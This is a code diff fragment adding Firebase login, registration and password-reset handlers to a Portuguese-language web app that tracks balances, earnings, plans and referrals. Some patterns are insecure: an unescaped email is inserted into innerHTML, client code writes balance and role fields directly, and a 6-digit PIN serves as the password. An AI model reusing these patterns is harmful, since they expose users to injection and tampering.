+    setBtnLoading('btnLogin', 'loginBtnText', 'loginSpinner', true);
+    // Block onAuthStateChanged from redirecting while we finish Firestore work
+    window._skipAuthRedirect = true;
+    try {
+      const cred = await window._fns.signInWithEmailAndPassword(window._auth, email, pass);
+      const user = cred.user;
+
+      // ── Ensure Firestore doc exists ──
+      // If the user was created before data saving was added,
+      // we create a minimal doc so the app never crashes.
+      const userRef  = window._fns.doc(window._db, 'users', user.uid);
+      const userSnap = await window._fns.getDoc(userRef);
+
+      if (!userSnap.exists()) {
+        await window._fns.setDoc(userRef, {
+          name:         user.displayName || '',
+          email:        user.email || '',
+          phone:        '',
+          userId:       genId(),
+          inviteId:     null,
+          balance:      0,
+          earnings:     0,
+          totalDeposit: 0,
+          freeEarnings: 0,
+          plan:         'free',
+          status:       'active',
+          createdAt:    window._fns.serverTimestamp(),
+          lastLoginAt:  window._fns.serverTimestamp(),
+          role:         'user'
+        });
+      } else {
+        // Update last login timestamp
+        await window._fns.setDoc(userRef, {
+          lastLoginAt: window._fns.serverTimestamp()
+        }, { merge: true });
+      }
+
+      // All Firestore work done — now redirect manually
+      showGlobal('Acesso autorizado. A redireccionar...', 'success');
+      setTimeout(() => { window.location.href = 'index.html'; }, 1200);
+
+    } catch (e) {
+      window._skipAuthRedirect = false; // release flag on error
+      showGlobal(fbError(e.code), 'error');
+      setBtnLoading('btnLogin', 'loginBtnText', 'loginSpinner', false);
+    }
+  }
+
+
+  /* ════════════════════════════════════════
+     9. REGISTER
+        — Creates Firebase Auth user
+        — Saves FULL profile to Firestore
+        — If invite ID given, also updates
+          the referrer's referral count
+     ════════════════════════════════════════ */
+  async function handleRegister() {
+    hideAlert('globalAlert');
+    const name   = document.getElementById('regName').value.trim();
+    const phone  = document.getElementById('regPhone').value.trim();
+    const email  = document.getElementById('regEmail').value.trim();
+    const pin    = getPinValue();
+    const invite = document.getElementById('regInvite').value.trim();
+
+    if (!name)          return showGlobal('Insira o seu nome completo.', 'error');
+    if (!phone)         return showGlobal('Insira o seu numero de telefone.', 'error');
+    if (!email)         return showGlobal('Insira o seu endereco de e-mail.', 'error');
+    if (pin.length < 6) return showGlobal('Insira todos os 6 digitos da senha.', 'error');
+
+    setBtnLoading('btnRegister', 'regBtnText', 'regSpinner', true);
+    // Block onAuthStateChanged from redirecting before Firestore data is saved
+    window._skipAuthRedirect = true;
+    try {
+      // 1. Create Auth user
+      const cred   = await window._fns.createUserWithEmailAndPassword(window._auth, email, pin);
+      const user   = cred.user;
+      const userId = user.uid;
+
+      // 2. Update display name in Auth
+      await window._fns.updateProfile(user, { displayName: name });
+
+      // 3. Generate friendly display ID
+      const userId_display = genId();
+
+      // 4. Save full user profile to Firestore
+      await window._fns.setDoc(window._fns.doc(window._db, 'users', userId), {
+        name,
+        phone,
+        email,
+        userId:        userId_display,
+        inviteId:      invite || null,        // referrer's display ID
+        referredBy:    invite || null,        // duplicate for easier querying
+        balance:       0,
+        earnings:      0,
+        totalDeposit:  0,
+        freeEarnings:  0,
+        withdrawals:   0,
+        plan:          'free',                // default plan
+        planStartDate: null,
+        status:        'active',
+        createdAt:     window._fns.serverTimestamp(),
+        lastLoginAt:   window._fns.serverTimestamp(),
+        role:          'user',
+        // referral stats for this new user
+        referralCount: 0,
+        referralEarnings: 0
+      });
+
+      // 5. If invite ID given, increment referrer's referral count
+      //    We query by the display userId field
+      if (invite) {
+        try {
+          // We can't query by field without an index, so we store a
+          // document in a "referrals" subcollection keyed by the referrer ID.
+          // This avoids needing a Firestore index and is append-only.
+          const referralRef = window._fns.doc(
+            window._db,
+            'referrals',
+            `${invite}_${userId_display}`
+          );
+          await window._fns.setDoc(referralRef, {
+            referrerId:   invite,
+            newUserId:    userId_display,
+            newUserName:  name,
+            newUserEmail: email,
+            createdAt:    window._fns.serverTimestamp(),
+            bonusPaid:    false
+          });
+        } catch (refErr) {
+          // Non-fatal — registration still succeeds
+          console.warn('Referral record failed:', refErr);
+        }
+      }
+
+      showGlobal('Conta criada com sucesso! A redireccionar...', 'success');
+      setTimeout(() => { window.location.href = 'index.html'; }, 1400);
+
+    } catch (e) {
+      window._skipAuthRedirect = false; // release flag on error
+      showGlobal(fbError(e.code), 'error');
+      setBtnLoading('btnRegister', 'regBtnText', 'regSpinner', false);
+    }
+  }
+
+
+  /* ════════════════════════════════════════
+     10. FORGOT PASSWORD
+     ════════════════════════════════════════ */
+  function openForgot() {
+    document.getElementById('forgotOverlay').classList.add('show');
+    document.getElementById('forgotEmail').value = document.getElementById('loginEmail').value;
+    document.getElementById('forgotAlert').className = 'alert';
+  }
+  function closeForgot() {
+    document.getElementById('forgotOverlay').classList.remove('show');
+  }
+  function closeForgotOutside(e) {
+    if (e.target === document.getElementById('forgotOverlay')) closeForgot();
+  }
+
+  async function handleForgot() {
+    const email = document.getElementById('forgotEmail').value.trim();
+    const fa    = document.getElementById('forgotAlert');
+    fa.className = 'alert';
+
+    if (!email) {
+      fa.className = 'alert alert-error show';
+      fa.innerHTML = '<div class="alert-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div><span>Insira o seu endereco de e-mail.</span>';
+      return;
+    }
+
+    setBtnLoading('btnForgot', 'forgotBtnText', 'forgotSpinner', true);
+    try {
+      await window._fns.sendPasswordResetEmail(window._auth, email);
+      fa.className = 'alert alert-success show';
+      fa.innerHTML = `<div class="alert-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div><span>Instrucoes enviadas para ${email}. Verifique a sua caixa de entrada.</span>`;
+    } catch (e) {
+      fa.className = 'alert alert-error show';
+      fa.innerHTML = `<div class="alert-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div><span>${fbError(e.code)}</span>`;
+    }
+    setBtnLoading('btnForgot', 'forgotBtnText', 'forgotSpinner', false);
+  }
+
+
+  /* ════════════════════════════════════════
+     11. BUTTON LOADING STATE
+     ════════════════════════════════════════ */
+  function setBtnLoading(btnId, textId, spinnerId, loading) {
+    document.getElementById(btnId).disabled                  = loading;
+    document.getElementById(textId).style.display            = loading ? 'none' : 'inline';
+    document.getElementById(spinnerId).style.display         = loading ? 'inline-flex' : 'none';
+  }
+
+
+  /* ════════════════════════════════════════
+     12. ENTER KEY SHORTCUTS
+     ════════════════════════════════════════ */
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Enter') {
+      if (document.getElementById('viewLogin').classList.contains('active')) handleLogin();
+      else handleRegister();
+    }
+  });
+</script>
+</body>
+</html>
